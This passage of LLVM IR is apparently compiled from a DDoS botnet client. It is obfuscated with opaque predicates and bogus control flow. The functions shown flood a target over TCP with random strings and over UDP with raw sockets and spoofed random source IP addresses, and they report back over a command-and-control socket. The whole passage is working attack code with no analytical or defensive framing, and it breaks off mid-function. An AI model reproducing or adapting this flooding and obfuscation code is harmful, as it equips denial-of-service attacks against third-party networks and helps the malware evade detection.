  %123 = load i32, i32* @x.57
  %124 = load i32, i32* @y.58
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %122
  %131 = load i32, i32* %15, align 4
  %132 = call i32 @close(i32 %131)
  call void @_exit(i32 0) #12
  %133 = load i32, i32* @x.57
  %134 = load i32, i32* @y.58
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  unreachable

; <label>:141:                                    ; preds = %originalBBpart216
  store i32 0, i32* %20, align 4
  br label %142

; <label>:142:                                    ; preds = %141, %originalBBpart26
  %143 = load i32, i32* %20, align 4
  %144 = add i32 %143, 1
  store i32 %144, i32* %20, align 4
  br label %65

originalBBalteredBB:                              ; preds = %originalBB, %3
  %145 = alloca i8*, align 8
  %146 = alloca i32, align 4
  %147 = alloca i32, align 4
  %148 = alloca i32, align 4
  %149 = alloca i32, align 4
  %150 = alloca i64, align 8
  %151 = alloca %struct.sockaddr_in, align 4
  %152 = alloca %struct.hostent*, align 8
  %153 = alloca i32, align 4
  %154 = alloca i32, align 4
  %155 = alloca [36 x i8*], align 16
  %156 = alloca i8*, align 8
  store i8* %0, i8** %145, align 8
  store i32 %1, i32* %146, align 4
  store i32 %2, i32* %147, align 4
  %157 = call i32 @fork() #2
  store i32 %157, i32* %149, align 4
  %158 = load i32, i32* %149, align 4
  %159 = icmp sgt i32 %158, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  %160 = bitcast [36 x i8*]* %22 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %160, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %161 = call i32 @rand() #2
  %162 = sext i32 %161 to i64
  %_ = sub i64 0, %162
  %gen = add i64 %_, 36
  %_2 = sub i64 0, %162
  %gen3 = add i64 %_2, 36
  %_4 = shl i64 %162, 36
  %163 = urem i64 %162, 36
  %164 = getelementptr inbounds [36 x i8*], [36 x i8*]* %22, i64 0, i64 %163
  %165 = load i8*, i8** %164, align 8
  store i8* %165, i8** %23, align 8
  %166 = load i32, i32* %20, align 4
  %167 = icmp uge i32 %166, 50
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %90
  %168 = load i32, i32* %15, align 4
  %169 = load i8*, i8** %23, align 8
  %170 = load i32, i32* %21, align 4
  %171 = sext i32 %170 to i64
  %172 = call i64 @send(i32 %168, i8* %169, i64 %171, i32 0)
  %173 = load i32, i32* %15, align 4
  %174 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %175 = call i32 @connect(i32 %173, %struct.sockaddr* %174, i32 16)
  %176 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %177 = sext i32 %176 to i64
  %178 = load i64, i64* %17, align 8
  %179 = load i32, i32* %14, align 4
  %180 = sext i32 %179 to i64
  %_9 = shl i64 %178, %180
  %_10 = sub i64 %178, %180
  %gen11 = mul i64 %_10, %180
  %_12 = shl i64 %178, %180
  %_13 = sub i64 %178, %180
  %gen14 = mul i64 %_13, %180
  %181 = add nsw i64 %178, %180
  %182 = icmp sge i64 %177, %181
  br label %originalBB8

originalBB18alteredBB:                            ; preds = %originalBB18, %122
  %183 = load i32, i32* %15, align 4
  %184 = call i32 @close(i32 %183)
  call void @_exit(i32 0) #12
  br label %originalBB18
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = load i32, i32* @x.59
  %10 = load i32, i32* @y.60
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.sockaddr_in, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  store i8* %0, i8** %17, align 8
  store i32 %1, i32* %18, align 4
  store i32 %2, i32* %19, align 4
  store i32 %3, i32* %20, align 4
  store i32 %4, i32* %21, align 4
  store i32 %5, i32* %22, align 4
  store i32 %6, i32* %23, align 4
  store i32 %7, i32* %24, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = load i32, i32* %18, align 4
  %44 = icmp eq i32 %43, 0
  %45 = load i32, i32* @x.59
  %46 = load i32, i32* @y.60
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %44, label %53, label %57

; <label>:53:                                     ; preds = %originalBBpart2
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %55, i16* %56, align 2
  br label %62

; <label>:57:                                     ; preds = %originalBBpart2
  %58 = load i32, i32* %18, align 4
  %59 = trunc i32 %58 to i16
  %60 = call zeroext i16 @htons(i16 zeroext %59) #13
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %60, i16* %61, align 2
  br label %62

; <label>:62:                                     ; preds = %57, %53
  %63 = load i8*, i8** %17, align 8
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %65 = call i32 @getHost(i8* %63, %struct.in_addr* %64)
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %62
  br label %519

; <label>:68:                                     ; preds = %62
  %69 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 3
  %70 = getelementptr inbounds [8 x i8], [8 x i8]* %69, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 8, i32 4, i1 false)
  %71 = load i32, i32* %22, align 4
  store i32 %71, i32* %26, align 4
  %72 = load i32, i32* %20, align 4
  %73 = icmp eq i32 %72, 32
  br i1 %73, label %74, label %168

; <label>:74:                                     ; preds = %68
  %75 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %75, i32* %27, align 4
  %76 = load i32, i32* %27, align 4
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %81, label %78

; <label>:78:                                     ; preds = %74
  %79 = load i32, i32* @mainCommSock, align 4
  %80 = call i32 (i32, i8*, ...) @sockprintf(i32 %79, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i32 0, i32 0))
  br label %519

; <label>:81:                                     ; preds = %74
  %82 = load i32, i32* %21, align 4
  %83 = add nsw i32 %82, 1
  %84 = sext i32 %83 to i64
  %85 = call noalias i8* @malloc(i64 %84) #2
  store i8* %85, i8** %28, align 8
  %86 = load i8*, i8** %28, align 8
  %87 = icmp eq i8* %86, null
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %81
  br label %519

; <label>:89:                                     ; preds = %81
  %90 = load i32, i32* @x.59
  %91 = load i32, i32* @y.60
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %89
  %98 = load i8*, i8** %28, align 8
  %99 = load i32, i32* %21, align 4
  %100 = add nsw i32 %99, 1
  %101 = sext i32 %100 to i64
  call void @llvm.memset.p0i8.i64(i8* %98, i8 0, i64 %101, i32 1, i1 false)
  %102 = load i8*, i8** %28, align 8
  %103 = load i32, i32* %21, align 4
  call void @makeRandomStr(i8* %102, i32 %103)
  %104 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %105 = load i32, i32* %19, align 4
  %106 = add nsw i32 %104, %105
  store i32 %106, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 0, i32* %31, align 4
  %107 = load i32, i32* @x.59
  %108 = load i32, i32* @y.60
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart215, label %originalBB1alteredBB

originalBBpart215:                                ; preds = %originalBB1
  br label %115

; <label>:115:                                    ; preds = %164, %160, %153, %originalBBpart215
  %116 = load i32, i32* %27, align 4
  %117 = load i8*, i8** %28, align 8
  %118 = load i32, i32* %21, align 4
  %119 = sext i32 %118 to i64
  %120 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  %121 = call i64 @sendto(i32 %116, i8* %117, i64 %119, i32 0, %struct.sockaddr* %120, i32 16)
  %122 = load i32, i32* %30, align 4
  %123 = load i32, i32* %26, align 4
  %124 = icmp eq i32 %122, %123
  br i1 %124, label %125, label %154

; <label>:125:                                    ; preds = %115
  %126 = load i32, i32* @x.59
  %127 = load i32, i32* @y.60
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %125
  %134 = load i32, i32* %18, align 4
  %135 = icmp eq i32 %134, 0
  %136 = load i32, i32* @x.59
  %137 = load i32, i32* @y.60
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %135, label %144, label %148

; <label>:144:                                    ; preds = %originalBBpart219
  %145 = call i32 @rand_cmwc()
  %146 = trunc i32 %145 to i16
  %147 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %146, i16* %147, align 2
  br label %148

; <label>:148:                                    ; preds = %144, %originalBBpart219
  %149 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %150 = load i32, i32* %29, align 4
  %151 = icmp sgt i32 %149, %150
  br i1 %151, label %152, label %153

; <label>:152:                                    ; preds = %148
  br label %167

; <label>:153:                                    ; preds = %148
  store i32 0, i32* %30, align 4
  br label %115

; <label>:154:                                    ; preds = %115
  %155 = load i32, i32* %30, align 4
  %156 = add i32 %155, 1
  store i32 %156, i32* %30, align 4
  %157 = load i32, i32* %31, align 4
  %158 = load i32, i32* %23, align 4
  %159 = icmp eq i32 %157, %158
  br i1 %159, label %160, label %164

; <label>:160:                                    ; preds = %154
  %161 = load i32, i32* %24, align 4
  %162 = mul nsw i32 %161, 1000
  %163 = call i32 @usleep(i32 %162)
  store i32 0, i32* %31, align 4
  br label %115

; <label>:164:                                    ; preds = %154
  %165 = load i32, i32* %31, align 4
  %166 = add i32 %165, 1
  store i32 %166, i32* %31, align 4
  br label %115

; <label>:167:                                    ; preds = %152
  br label %519

; <label>:168:                                    ; preds = %68
  %169 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %169, i32* %32, align 4
  %170 = load i32, i32* %32, align 4
  %171 = icmp ne i32 %170, 0
  br i1 %171, label %191, label %172

; <label>:172:                                    ; preds = %168
  %173 = load i32, i32* @x.59
  %174 = load i32, i32* @y.60
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %172
  %181 = load i32, i32* @mainCommSock, align 4
  %182 = call i32 (i32, i8*, ...) @sockprintf(i32 %181, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i32 0, i32 0))
  %183 = load i32, i32* @x.59
  %184 = load i32, i32* @y.60
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %519

; <label>:191:                                    ; preds = %168
  store i32 1, i32* %33, align 4
  %192 = load i32, i32* %32, align 4
  %193 = bitcast i32* %33 to i8*
  %194 = call i32 @setsockopt(i32 %192, i32 0, i32 3, i8* %193, i32 4) #2
  %195 = icmp slt i32 %194, 0
  br i1 %195, label %196, label %199

; <label>:196:                                    ; preds = %191
  %197 = load i32, i32* @mainCommSock, align 4
  %198 = call i32 (i32, i8*, ...) @sockprintf(i32 %197, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.74, i32 0, i32 0))
  br label %519

; <label>:199:                                    ; preds = %191
  store i32 50, i32* %34, align 4
  br label %200

; <label>:200:                                    ; preds = %originalBBpart231, %199
  %201 = load i32, i32* %34, align 4
  %202 = add nsw i32 %201, -1
  store i32 %202, i32* %34, align 4
  %203 = icmp ne i32 %201, 0
  br i1 %203, label %204, label %225

; <label>:204:                                    ; preds = %200
  %205 = load i32, i32* @x.59
  %206 = load i32, i32* @y.60
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %204
  %213 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %214 = call i32 @rand_cmwc()
  %215 = xor i32 %213, %214
  call void @srand(i32 %215) #2
  %216 = call i32 @rand() #2
  call void @init_rand(i32 %216)
  %217 = load i32, i32* @x.59
  %218 = load i32, i32* @y.60
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBBpart231, label %originalBB25alteredBB

originalBBpart231:                                ; preds = %originalBB25
  br label %200

; <label>:225:                                    ; preds = %200
  %226 = load i32, i32* @x.59
  %227 = load i32, i32* @y.60
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %225
  %234 = load i32, i32* %20, align 4
  %235 = icmp eq i32 %234, 0
  %236 = load i32, i32* @x.59
  %237 = load i32, i32* @y.60
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %235, label %244, label %245

; <label>:244:                                    ; preds = %originalBBpart235
  store i32 0, i32* %35, align 4
  br label %251

; <label>:245:                                    ; preds = %originalBBpart235
  %246 = load i32, i32* %20, align 4
  %247 = sub nsw i32 32, %246
  %248 = shl i32 1, %247
  %249 = sub nsw i32 %248, 1
  %250 = xor i32 %249, -1
  store i32 %250, i32* %35, align 4
  br label %251

; <label>:251:                                    ; preds = %245, %244
  %252 = load i32, i32* @x.59
  %253 = load i32, i32* @y.60
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %251
  %260 = load i32, i32* %21, align 4
  %261 = sext i32 %260 to i64
  %262 = add i64 28, %261
  %263 = call i8* @llvm.stacksave()
  store i8* %263, i8** %36, align 8
  %264 = alloca i8, i64 %262, align 16
  %265 = bitcast i8* %264 to %struct.iphdr*
  store %struct.iphdr* %265, %struct.iphdr** %37, align 8
  %266 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %267 = bitcast %struct.iphdr* %266 to i8*
  %268 = getelementptr i8, i8* %267, i64 20
  %269 = bitcast i8* %268 to %struct.udphdr*
  store %struct.udphdr* %269, %struct.udphdr** %38, align 8
  %270 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %271 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %272 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %271, i32 0, i32 0
  %273 = load i32, i32* %272, align 4
  %274 = load i32, i32* %35, align 4
  %275 = call i32 @GetRandomIP(i32 %274)
  %276 = call i32 @htonl(i32 %275) #13
  %277 = load i32, i32* %21, align 4
  %278 = sext i32 %277 to i64
  %279 = add i64 8, %278
  %280 = trunc i64 %279 to i32
  call void @makeIPPacket(%struct.iphdr* %270, i32 %273, i32 %276, i8 zeroext 17, i32 %280)
  %281 = load i32, i32* %21, align 4
  %282 = sext i32 %281 to i64
  %283 = add i64 8, %282
  %284 = trunc i64 %283 to i16
  %285 = call zeroext i16 @htons(i16 zeroext %284) #13
  %286 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i32 0, i32 0
  %288 = bitcast %union.anon.3* %287 to %struct.anon.4*
  %289 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %288, i32 0, i32 2
  store i16 %285, i16* %289, align 2
  %290 = call i32 @rand_cmwc()
  %291 = trunc i32 %290 to i16
  %292 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %293 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %292, i32 0, i32 0
  %294 = bitcast %union.anon.3* %293 to %struct.anon.4*
  %295 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %294, i32 0, i32 0
  store i16 %291, i16* %295, align 2
  %296 = load i32, i32* %18, align 4
  %297 = icmp eq i32 %296, 0
  %298 = load i32, i32* @x.59
  %299 = load i32, i32* @y.60
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart260, label %originalBB37alteredBB

originalBBpart260:                                ; preds = %originalBB37
  br i1 %297, label %306, label %308

; <label>:306:                                    ; preds = %originalBBpart260
  %307 = call i32 @rand_cmwc()
  br label %313

; <label>:308:                                    ; preds = %originalBBpart260
  %309 = load i32, i32* %18, align 4
  %310 = trunc i32 %309 to i16
  %311 = call zeroext i16 @htons(i16 zeroext %310) #13
  %312 = zext i16 %311 to i32
  br label %313

; <label>:313:                                    ; preds = %308, %306
  %314 = phi i32 [ %307, %306 ], [ %312, %308 ]
  %315 = trunc i32 %314 to i16
  %316 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %317 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %316, i32 0, i32 0
  %318 = bitcast %union.anon.3* %317 to %struct.anon.4*
  %319 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %318, i32 0, i32 1
  store i16 %315, i16* %319, align 2
  %320 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %321 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %320, i32 0, i32 0
  %322 = bitcast %union.anon.3* %321 to %struct.anon.4*
  %323 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %322, i32 0, i32 3
  store i16 0, i16* %323, align 2
  %324 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %325 = bitcast %struct.udphdr* %324 to i8*
  %326 = getelementptr inbounds i8, i8* %325, i64 8
  %327 = load i32, i32* %21, align 4
  call void @makeRandomStr(i8* %326, i32 %327)
  %328 = bitcast i8* %264 to i16*
  %329 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %330 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %329, i32 0, i32 2
  %331 = load i16, i16* %330, align 2
  %332 = zext i16 %331 to i32
  %333 = call zeroext i16 @csum(i16* %328, i32 %332)
  %334 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %335 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %334, i32 0, i32 7
  store i16 %333, i16* %335, align 2
  %336 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %337 = load i32, i32* %19, align 4
  %338 = add nsw i32 %336, %337
  store i32 %338, i32* %39, align 4
  store i32 0, i32* %40, align 4
  store i32 0, i32* %41, align 4
  br label %339

; <label>:339:                                    ; preds = %498, %494, %originalBBpart280, %313
  %340 = load i32, i32* @x.59
  %341 = load i32, i32* @y.60
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %339
  %348 = load i32, i32* @x.59
  %349 = load i32, i32* @y.60
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %356

; <label>:356:                                    ; preds = %originalBBpart264
  %357 = load i32, i32* @x.59
  %358 = load i32, i32* @y.60
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %356
  %365 = load i32, i32* %32, align 4
  %366 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  %367 = call i64 @sendto(i32 %365, i8* %264, i64 %262, i32 0, %struct.sockaddr* %366, i32 16)
  %368 = call i32 @rand_cmwc()
  %369 = trunc i32 %368 to i16
  %370 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %371 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %370, i32 0, i32 0
  %372 = bitcast %union.anon.3* %371 to %struct.anon.4*
  %373 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %372, i32 0, i32 0
  store i16 %369, i16* %373, align 2
  %374 = load i32, i32* %18, align 4
  %375 = icmp eq i32 %374, 0
  %376 = load i32, i32* @x.59
  %377 = load i32, i32* @y.60
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %375, label %384, label %402

; <label>:384:                                    ; preds = %originalBBpart268
  %385 = load i32, i32* @x.59
  %386 = load i32, i32* @y.60
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %384
  %393 = call i32 @rand_cmwc()
  %394 = load i32, i32* @x.59
  %395 = load i32, i32* @y.60
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %407

; <label>:402:                                    ; preds = %originalBBpart268
  %403 = load i32, i32* %18, align 4
  %404 = trunc i32 %403 to i16
  %405 = call zeroext i16 @htons(i16 zeroext %404) #13
  %406 = zext i16 %405 to i32
  br label %407

; <label>:407:                                    ; preds = %402, %originalBBpart272
  %408 = phi i32 [ %393, %originalBBpart272 ], [ %406, %402 ]
  %409 = load i32, i32* @x.59
  %410 = load i32, i32* @y.60
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %407
  %417 = trunc i32 %408 to i16
  %418 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %419 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %418, i32 0, i32 0
  %420 = bitcast %union.anon.3* %419 to %struct.anon.4*
  %421 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %420, i32 0, i32 1
  store i16 %417, i16* %421, align 2
  %422 = call i32 @rand_cmwc()
  %423 = trunc i32 %422 to i16
  %424 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 3
  store i16 %423, i16* %425, align 4
  %426 = load i32, i32* %35, align 4
  %427 = call i32 @GetRandomIP(i32 %426)
  %428 = call i32 @htonl(i32 %427) #13
  %429 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %430 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %429, i32 0, i32 8
  store i32 %428, i32* %430, align 4
  %431 = bitcast i8* %264 to i16*
  %432 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i32 0, i32 2
  %434 = load i16, i16* %433, align 2
  %435 = zext i16 %434 to i32
  %436 = call zeroext i16 @csum(i16* %431, i32 %435)
  %437 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %438 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %437, i32 0, i32 7
  store i16 %436, i16* %438, align 2
  %439 = load i32, i32* %40, align 4
  %440 = load i32, i32* %26, align 4
  %441 = icmp eq i32 %439, %440
  %442 = load i32, i32* @x.59
  %443 = load i32, i32* @y.60
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %441, label %450, label %472

; <label>:450:                                    ; preds = %originalBBpart276
  %451 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %452 = load i32, i32* %39, align 4
  %453 = icmp sgt i32 %451, %452
  br i1 %453, label %454, label %455

; <label>:454:                                    ; preds = %450
  br label %501

; <label>:455:                                    ; preds = %450
  %456 = load i32, i32* @x.59
  %457 = load i32, i32* @y.60
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %455
  store i32 0, i32* %40, align 4
  %464 = load i32, i32* @x.59
  %465 = load i32, i32* @y.60
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %339

; <label>:472:                                    ; preds = %originalBBpart276
  %473 = load i32, i32* @x.59
  %474 = load i32, i32* @y.60
  %475 = sub i32 %473, 1
  %476 = mul i32 %473, %475
  %477 = urem i32 %476, 2
  %478 = icmp eq i32 %477, 0
